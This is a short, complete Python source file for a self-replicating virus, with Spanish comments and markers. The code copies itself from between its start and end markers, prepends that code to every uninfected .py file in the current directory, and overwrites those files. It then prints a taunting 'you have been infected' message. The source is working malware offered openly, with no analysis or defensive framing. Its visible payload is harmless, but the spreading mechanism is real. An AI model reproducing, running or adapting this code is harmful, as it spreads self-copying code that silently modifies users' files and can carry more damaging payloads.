###INICIO-VIRUS###

import sys, glob

codigo = []

with open(sys.argv[0], 'r') as f:
    lineas = f.readlines()

area_virus = False

for linea in lineas:
    if linea == '###INICIO-VIRUS###\n':
        area_virus= True
    if area_virus:
        codigo.append(linea)
    if linea == '###FIN-VIRUS###\n':
        break

python_scripts = glob.glob('*.py')

for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False

    for linea in script_code:
        if linea == '###INICIO-VIRUS###\n':
            infected = True
            break

    if not infected:
        codigo_final = []
        codigo_final.extend(codigo)
        codigo_final.extend('\n')
        codigo_final.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(codigo_final)

# Codigo Malicioso (Payload)
print('Usted ha sido infectado! ja ja ja')

###FIN-VIRUS###
